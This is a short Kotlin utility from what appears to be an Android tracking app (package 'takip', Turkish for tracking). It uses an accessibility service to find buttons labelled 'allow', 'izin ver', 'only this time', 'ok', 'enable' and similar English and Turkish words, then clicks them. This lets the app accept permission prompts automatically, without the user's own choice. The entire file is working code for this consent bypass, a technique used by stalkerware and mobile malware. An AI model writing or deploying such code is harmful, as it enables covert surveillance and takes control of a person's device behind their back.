package com.takip.app.util

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityNodeInfo

object PermissionAutoGranter {
    private val allowTexts = listOf(
        "allow", "izin ver", "while using", "kullanırken", "only this time",
        "yalnızca bu sefer", "tamam", "ok", "kabul", "onayla", "aç", "enable", "turn on"
    )

    fun tryAutoGrant(service: AccessibilityService) {
        val root = service.rootInActiveWindow ?: return
        clickAllowNodes(root)
        root.recycle()
    }

    private fun clickAllowNodes(node: AccessibilityNodeInfo): Boolean {
        val text = buildString {
            node.text?.let { append(it).append(' ') }
            node.contentDescription?.let { append(it) }
        }.lowercase()

        if (text.isNotBlank() && allowTexts.any { text.contains(it) }) {
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    parent.recycle()
                    return true
                }
                val next = parent.parent
                parent.recycle()
                parent = next
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (clickAllowNodes(child)) {
                child.recycle()
                return true
            }
            child.recycle()
        }
        return false
    }
}
